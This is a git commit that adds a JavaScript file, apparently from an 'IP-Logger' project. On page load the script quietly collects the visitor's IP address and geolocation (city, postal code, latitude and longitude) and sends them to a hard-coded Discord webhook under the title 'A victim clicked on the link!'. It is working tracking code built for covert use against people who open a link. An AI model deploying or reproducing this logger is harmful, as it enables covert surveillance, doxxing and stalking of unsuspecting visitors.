ee86cf93923fb1d62abd24f3c95c0d9600b3ebe0
ARMed0ps <armitha786@gmail.com>
2025-07-03 14:37:31 +0200

    Add files via upload

---
+++ script.js
@@ -0,0 +1,42 @@
+const sendIP = () => {
+    fetch('https://api.ipify.org?format=json')
+        .then(ipResponse => ipResponse.json())
+        .then(ipData => {
+            const ipadd = ipData.ip;
+            return fetch(`https://ipapi.co/${ipadd}/json/`)
+                .then(geoResponse => geoResponse.json())
+                .then(geoData => {
+                    const dscURL = 'https://discord.com/api/webhooks/1390010606735855758/m5QI75MVeDo3HXoZEWJ915si95wq8i5NVUDdYKYyT0WEWSPkskHPVHatwCe-nvLkT-Xk'; // replace with your webhook url
+                    return fetch(dscURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            username: "1pl0gg3r", // optionally changeable
+                            avatar_url: "https://armitha-cyber.github.io/IP-Logger/hackerpfp.jpg", // optionally changeable
+                            content: `@everyone`,
+                            embeds: [
+                                {
+                                    title: 'A victim clicked on the link!',
+                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    color: 0x800080 // optionally changeable
+                                }
+                            ]
+                        })
+                    });
+                });
+        })
+        .then(dscResponse => {  
+            if (dscResponse.ok) {
+                console.log('Sent! <3');
+            } else {
+                console.log('Failed :(');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            console.log('Error :(');
+        });
+};
+sendIP();
